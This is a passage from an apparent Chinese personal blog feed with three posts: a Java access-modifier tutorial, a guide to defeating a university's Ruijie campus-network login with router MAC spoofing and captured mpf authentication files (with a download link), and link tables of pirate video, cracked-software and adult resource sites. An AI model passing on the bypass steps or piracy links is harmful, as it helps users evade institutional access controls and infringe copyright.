id="类和类之间的关系"><a href="#类和类之间的关系" class="headerlink" title="类和类之间的关系"></a>类和类之间的关系</h4><p>类和类之间的关系有如下几种:<br>以Hero为例<br><strong>自身：</strong>指的是Hero自己<br><strong>同包子类：</strong>ADHero这个类是Hero的子类，并且和Hero处于<strong>同一个包下</strong><br><strong>不同包子类：</strong>Support这个类是Hero的子类，但是在<strong>另一个包下</strong><br><strong>同包类：</strong> GiantDragon 这个类和Hero是<strong>同一个包</strong>，但是彼此<strong>没有继承关系</strong><br><strong>其他类：</strong>Item这个类，<strong>在不同包</strong>，也没有继承关系的类</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/605.jpg" alt="605" loading="lazy"></p><h4 id="private-私有的"><a href="#private-私有的" class="headerlink" title="private 私有的"></a>private 私有的</h4><p>使用private修饰属性<br>自身：是可以访问的<br>同包子类：不能继承<br>不同包子类：不能继承<br>同包类：不能访问<br>其他包类：不能访问</p><p><strong>注：</strong> 红色字体，表示不可行</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/604.jpg" alt="604" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token comment">//属性id是private的，只有Hero自己可以访问</span>    <span class="token comment">//子类不能继承</span>    <span class="token comment">//其他类也不能访问</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="package-friendly-default-不写"><a href="#package-friendly-default-不写" class="headerlink" title="package/friendly/default 不写"></a>package/friendly/default 不写</h4><p>没有修饰符即代表package/friendly/default<br>float maxHP; 血量上限</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/609.jpg" alt="609" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token comment">// 无修饰符的属性 hp</span>    <span class="token comment">// 自己可以访问</span>     <span class="token comment">// 同包子类可以继承</span>    <span class="token comment">// 不同包子类不能继承</span>     <span class="token comment">// 同包类可以访问</span>    <span class="token comment">// 不同包类不能访问</span>    <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">// 无修饰符的属性 hp</span><span class="token comment">// 自己可以访问</span> <span class="token comment">// 同包子类可以继承</span><span class="token comment">// 不同包子类不能继承</span> <span class="token comment">// 同包类可以访问</span><span class="token comment">// 不同包类不能访问</span><span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protected-受保护的"><a href="#protected-受保护的" class="headerlink" title="protected 受保护的"></a>protected 受保护的</h4><p>受保护的修饰符<br>protected float hp; 血量</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/610.jpg" alt="610" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token comment">// protected饰符的属性 hp</span>    <span class="token comment">// 自己可以访问</span>     <span class="token comment">// 同包子类可以继承</span>    <span class="token comment">// 不同包子类可以继承</span>     <span class="token comment">// 同包类可以访问</span>    <span class="token comment">// 不同包类不能访问</span>    <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="public-公共的"><a href="#public-公共的" class="headerlink" title="public 公共的"></a>public 公共的</h4><p>公共的修饰符<br>public String name; 姓名<br>任何地方，都可以访问</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/611.jpg" alt="611" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// public的属性 name</span><span class="token comment">// 自己可以访问</span> <span class="token comment">// 同包子类可以继承</span><span class="token comment">// 不同包子类可以继承</span> <span class="token comment">// 同包类可以访问</span><span class="token comment">// 不同包类可以访问</span><span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/612.jpg" alt="612" loading="lazy"></p><h4 id="使用总结"><a href="#使用总结" class="headerlink" title="使用总结"></a>使用总结</h4><p>那么什么情况该用什么修饰符呢？<br>从作用域来看，public能够使用所有的情况。 但是大家在工作的时候，又不会真正全部都使用public,那么到底什么情况该用什么修饰符呢？</p><ol><li>属性通常使用private封装起来</li><li>方法一般使用public用于被调用</li><li>会被子类继承的方法，通常使用protected</li><li>package用的不多，一般新手会用package,因为还不知道有修饰符这个东西</li></ol><p>再就是<strong>作用范围最小原则</strong><br>简单说，能用private就用private，不行就放大一级，用package,再不行就用protected，最后用public。 这样就能把数据尽量的封装起来，没有必要<strong>露出来的</strong>，就不用<strong>露出来</strong>了</p>]]></content>
      
      
      <categories>
          
          <category> java学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老毛子搞定锐捷认证</title>
      <link href="2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/"/>
      <url>2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>帮舍友破解了学校的联通校园网，我只能说：</p><p>锐捷，有手就行</p><a id="more"></a><h2 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h2><p>原理很简单，就是把官方的认证放到路由器上，用路由器伪装自己的电脑登录账号，然后再把网络分享出来。学校的校园网客户端一般都是不给开热点的，主要是为了多卖多恰钱，懂得都懂。</p><h2 id="老毛子认证过程"><a href="#老毛子认证过程" class="headerlink" title="老毛子认证过程"></a>老毛子认证过程</h2><h3 id="一共就这下年4个步骤按照顺序来就肯定可以用"><a href="#一共就这下年4个步骤按照顺序来就肯定可以用" class="headerlink" title="!!!一共就这下年4个步骤按照顺序来就肯定可以用"></a>!!!一共就这下年4个步骤按照顺序来就肯定可以用</h3><h5 id="刷好老毛子固件"><a href="#刷好老毛子固件" class="headerlink" title="刷好老毛子固件"></a>刷好老毛子固件</h5><h5 id="伪装mac-伪装成你的电脑"><a href="#伪装mac-伪装成你的电脑" class="headerlink" title="伪装mac,伪装成你的电脑"></a>伪装mac,伪装成你的电脑</h5><h5 id="打开ssh-把mpf文件传进起来"><a href="#打开ssh-把mpf文件传进起来" class="headerlink" title="打开ssh, 把mpf文件传进起来"></a>打开ssh, 把mpf文件传进起来</h5><p>PS:mpf文件就是抓官方认证程序的认证的通讯协议的一个文件<br>这里传一个成都信息工程大学的mpf文件还有抓包软件<a href="http://file.skywang.fun/mpf%E6%8A%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E4%BB%A5%E5%8F%8ACUIT%E7%9A%84mpf%E6%96%87%E4%BB%B6.7z">cuit的移动, 电信, 联通的mpf认证文件</a></p><h5 id="输入账号密码连接"><a href="#输入账号密码连接" class="headerlink" title="输入账号密码连接."></a>输入账号密码连接.</h5><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h4 id="伪装Mac"><a href="#伪装Mac" class="headerlink" title="伪装Mac"></a>伪装Mac</h4><p>首先用自己的电脑插上网线，连接上客户端，查看mac地址</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128211809100.png" alt="image-20201128211809100" loading="lazy"></p><p>然后进入老毛子的后台，在这个位置伪装</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128211916301.png" alt="image-20201128211916301" loading="lazy"></p><h4 id="打开ssh-把mpf文件传进起来-1"><a href="#打开ssh-把mpf文件传进起来-1" class="headerlink" title="打开ssh, 把mpf文件传进起来"></a>打开ssh, 把mpf文件传进起来</h4><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212028903.png" alt="image-20201128212028903" loading="lazy"></p><p>这里我用的是WINSCP,选择SCP模式主机名字就是路由器后台地址，用户名密码就是后台登录的用户名密码</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212400835.png" alt="image-20201128212400835" loading="lazy"></p><p>连接上后把抓包到的MPF文件传到/etc/storage这个目录</p><p>之前已经附上成都信息工程大学的移动还有联通的mpf文件, 以及一个抓包软件, 不同学校的同学自己抓就行了</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212609567.png" alt="image-20201128212609567" loading="lazy"></p><p>然后进路由器后台，保存一下</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212718027.png" alt="image-20201128212718027" loading="lazy"></p><h2 id="输入账号密码连接-1"><a href="#输入账号密码连接-1" class="headerlink" title="输入账号密码连接"></a>输入账号密码连接</h2><p>输入账号密码</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212958797.png" alt="image-20201128212958797" loading="lazy"></p><p>然后下面这么设置（这是成都信息工程大学的设置方法，其他的学校DHCP设置可能要改）</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128213222096.png" alt="image-20201128213222096" loading="lazy"></p><p>然后小地球亮了就是连接好了</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128213319350.png" alt="image-20201128213319350" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 老毛子搞定锐捷认证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 好东西 </tag>
            
            <tag> 校园网破解 </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收集的一些网站（不定期更新）</title>
      <link href="2020/11/22/%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>2020/11/22/%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><div id="binft"></div> <script>   var binft = function (r) {     function t() {       return b[Math.floor(Math.random() * b.length)]     }       function e() {       return String.fromCharCode(94 * Math.random() + 33)     }     function n(r) {       for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {         var l = document.createElement("span");         l.textContent = e(), l.style.color = t(), n.appendChild(l)       }       return n     }     function i() {       var t = o[c.skillI];       c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)     }     var l = "",     o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {     return r + ""     }),     a = 2,     g = 1,     s = 5,     d = 75,     b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],     c = {       text: "",       prefixP: -s,       skillI: 0,       skillP: 0,       direction: "forward",       delay: a,       step: g     };     i()     };     binft(document.getElementById('binft')); </script>分享一些特殊的网站**持续更新**[欢迎在下方留言补充更多网站](#website)</blockquote><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>定期处理失效链接</p><h3 id="在线视频"><a href="#在线视频" class="headerlink" title="在线视频"></a>在线视频</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请使用<strong>正版视频</strong>软件，支持正版人人有责</p></blockquote><p>最近迷上了 TVB 的几部经典的金庸剧，找了一圈资源，唯独优酷的视频清晰度最高，而且还流畅。所以有些时候啊，会员该充还是要充，别白嫖嫖习惯了</p><p>剧荒的小伙伴，可以看看<a href="http://1090ys.com/show/1836.html">豆瓣电影top250</a> ，刷刷经典电影，<a href="http://1090ys.com/">1090影视</a> 的站长辛苦整理，都是高清片源，挺不容易的，好东西就应该支持一波，还有各种豆瓣合集在线观看</p><h4 id="无广告-正常广告"><a href="#无广告-正常广告" class="headerlink" title="无广告 / 正常广告"></a>无广告 / 正常广告</h4><blockquote><p>越来越多的网站都有了广告，这也是没办法的事，且用且珍惜</p></blockquote><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="http://www.novipnoad.com/"><strong>NO 视频</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>无广告</code> <code>多个字幕组</code> <code>更新速度快</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://ddrk.me/"><strong>低端影视</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>有广告</code> <code>字幕质量高</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://xijing.tv/"><strong>xijingtv</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>无广告</code> <code>可下载</code> <code>更新快</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="https://www.duboku.net/"><strong>独播库</strong></a></td><td align="center"><strong>全能 / 海外</strong></td><td align="center"><code>需要 FQ</code> <code>正常广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://www.mengmiandaxia.cn/"><strong>蒙面大侠</strong></a></td><td align="center"><strong>全能</strong></td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://www.paofans.net/"><strong>泡饭影视</strong></a></td><td align="center"><strong>全能</strong></td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://bde4.com/">哔嘀影视</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>高清资源</code> <code>资源全</code></td></tr><tr><td align="center"><a href="https://www.52dy.vip/">吾爱电影</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>高清资源</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://www.jiurenyu.top/">看趣视频</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.dililitv.com/">嘀喱喱</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.78zhuiju.com/">西瓜追剧</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.snailok.com/">蜗牛视频</a></td><td align="center">全能 / 韩剧</td><td align="center"><code>无广告</code> <code>韩剧资源全</code></td></tr><tr><td align="center"><a href="https://www.taijumi.cc/">泰剧迷</a></td><td align="center">泰剧</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.clicli.me/"><strong>clicli</strong></a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code> <code>画质高</code></td></tr><tr><td align="center"><a href="https://www.agefans.tv/">AGE 动漫</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫资源全</code> <code>更新快</code> <code>加载快</code></td></tr><tr><td align="center"><a href="http://www.zzzfun.com/">ZzzFun</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="http://www.bimibimi.tv/">哔咪哔咪</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code></td></tr></tbody></table><h4 id="棋牌-开车广告"><a href="#棋牌-开车广告" class="headerlink" title="棋牌 / 开车广告"></a>棋牌 / 开车广告</h4><p>赚钱也不容易，据说是网站只能接这种广告，谷歌广告审核通不过的</p><p>不过我实在很讨厌这种广告，我单独列个表吧，大家自行选择，有些网站更新也快，资源多，确实也还行</p><p>广告基本都出现在移动端，电脑端没有，也好屏蔽，最好是在电脑上使用</p><blockquote><p>Win/Mac 浏览器推荐 Chrome/ 火狐，安装扩展 <a href="https://orxing.top/post/acf529c5.html#%E6%89%A9%E5%B1%95%E6%8E%A8%E8%8D%90">uBlock Origin</a><br>Android 浏览器推荐<a href="https://www.coolapk.com/apk/com.qihoo.contents">极速浏览器</a><br>iOS 浏览器推荐 Alook<br>上述浏览器经过设置后可以完全过滤下列网站的广告</p></blockquote><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.nfmovies.com/"><strong>奈菲影视</strong></a></td><td align="center">全能 / 海外</td><td align="center"><code>有片头广告</code> <code>资源清晰度高</code> <code>资源相当全</code></td></tr><tr><td align="center"><a href="http://1090ys.com/"><strong>1090 影视</strong></a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>资源相当全</code></td></tr><tr><td align="center"><a href="https://www.wanmeikk.me/">完美看看</a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="https://www.shenma4480.com/">神马影院</a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>热门资源全</code></td></tr></tbody></table><p>以下网站自行尝试筛选，如遇到链接失效，请自行搜索名字</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">网站</th><th align="center">分类</th></tr></thead><tbody><tr><td align="center"><a href="https://gimy.tv/">剧迷</a></td><td align="center">全能</td><td align="center"><a href="https://www.dixidixi.com/">dixidixi</a></td><td align="center">全能 / 国产</td></tr><tr><td align="center"><a href="https://www.tcmove.com/">太初电影</a></td><td align="center">全能 / 国产</td><td align="center"><a href="https://www.zxzj.me/">在线之家</a></td><td align="center">海外剧</td></tr><tr><td align="center"><a href="https://www.dybee.tv/">电影蜜蜂</a></td><td align="center">全能</td><td align="center"></td><td align="center"></td></tr></tbody></table><hr><h3 id="Onedrive-资源站"><a href="#Onedrive-资源站" class="headerlink" title="Onedrive_资源站"></a>Onedrive_资源站</h3><blockquote><p>Ondrive 提供一个很方便的 API 来搭建自己的私人云盘，而且 Onedrive 不限速，所以现在不少小伙伴都有了自己的资源站，并且将资源免费分享给大家<br><strong>可能需要自备梯子</strong></p></blockquote><p>这里我搜集了几个比较有特点的资源站，也欢迎小伙伴来分享</p><p>看有小伙伴需要梯子，目前来说，v2ray 的稳定性比较好。我个人用的免费梯子，要是想要可以加群找我（我是群主）群：172622261</p><p>鉴于这些网站经常失效，此板块不再更新</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://herokuonedrive.herokuapp.com/">某人の地盘</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>18 禁</code> <code>周杰伦无损全集</code></td></tr><tr><td align="center"><a href="https://storage.imouto.tech/home">季悠然の小仓库</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>Adobe 大师版</code> <code>PPT 模板</code></td></tr><tr><td align="center"><a href="http://qzyz.123yes.me/">Qif- 网络资源下载站</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>进击的巨人</code> <code>东京食尸鬼</code></td></tr><tr><td align="center"><a href="https://od.xxorg.com/">XXORG</a></td><td align="center">综合</td><td align="center"><code>樊登读书会</code> <code>大量机械工业出版社出版图书</code></td></tr><tr><td align="center"><a href="https://od.lezi.me/Study/">Jialezi</a></td><td align="center">综合</td><td align="center"><code>喜马拉雅音频</code> <code>大量机械工业出版社出版图书</code></td></tr><tr><td align="center"><a href="https://pan.macxin.com/">萌新云盘</a></td><td align="center">软件</td><td align="center"><code>专业软件</code> <code>Adobe 系列</code> <code>Autodesk 系列</code> <code>Matlab 系列</code></td></tr><tr><td align="center"><a href="https://filmindex.herokuapp.com/">Film_Index</a></td><td align="center">视频</td><td align="center"><code>豆瓣 Top250 所有电影</code> <code>真蓝光 1080P</code></td></tr><tr><td align="center"><a href="https://www.escaped.cn/oneindex/?/Movie">逃离の云盘</a></td><td align="center">视频</td><td align="center"><code>漫威宇宙</code></td></tr><tr><td align="center"><a href="https://lf.ztxdjj.me/">一盘</a></td><td align="center">番剧</td><td align="center"><code>里番：111111</code> <code>无修：333333</code></td></tr><tr><td align="center"><a href="https://pan.lifan.ooo/">里番</a></td><td align="center">视频</td><td align="center"><code>大量资源</code> <code>18 禁</code> <code>本子</code> <code>特摄</code></td></tr></tbody></table><hr><h3 id="破解软件"><a href="#破解软件" class="headerlink" title="破解软件"></a>破解软件</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请使用<strong>正版</strong>软件，支持正版人人有责</p></blockquote><p>破解软件这个圈吧，水有点深，有人将软件破解后自己加壳重新收费，有人甚至在里面加病毒，所以，百度上找破解软件大部分不安全</p><p>加粗网站我经常使用，可以放心使用，其余网站较少使用，但也相对安全</p><p><strong>破解软件的安全性特别重要，分享时请确保其安全性</strong></p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.mpyit.com/"><strong>殁漂遥</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">强烈推荐，推荐的软件都很实用，坚决不收费，配图有惊喜</td></tr><tr><td align="center"><a href="http://www.carrotchou.com/"><strong>胡萝卜周</strong></a></td><td align="center"><code>Windows</code> <code>macOS</code> <code>Android</code></td><td align="center">强烈推荐，比上面的软件要高级点</td></tr><tr><td align="center"><a href="https://www.ghpym.com/"><strong>果核剥壳</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">强烈推荐，比上面两个更新要快点</td></tr><tr><td align="center"><a href="https://www.52pojie.cn/">吾爱破解</a></td><td align="center"><code>全平台</code></td><td align="center">破解软件的摇篮，养活了一大批破解网站，但安全性不可知</td></tr><tr><td align="center"><a href="https://mp.weixin.qq.com/s/ZuKohAeMMHpQHq9yPp_3Gg">火耳软件安装</a></td><td align="center"><code>Windows</code></td><td align="center">提供各类专业软件安装包和安装教程</td></tr><tr><td align="center"><a href="https://hrtsea.com/"><strong>心海 e 站</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">安卓软件破解很出名</td></tr><tr><td align="center"><a href="https://www.appcgn.com/">软件缘</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色软件，其特点是下载地址很多</td></tr><tr><td align="center"><a href="https://portableappk.com/">绿色便携软件倡导者</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色软件，但是下载速度慢，部分软件需要付费下载</td></tr><tr><td align="center"><a href="https://orxing.top/post/[http://www.th-sjy.com](http://www.th-sjy.com/)">th_sjy 汉化博客</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色汉化软件</td></tr><tr><td align="center"><a href="https://www.macdu.org/">mac 毒</a></td><td align="center"><code>macOS</code></td><td 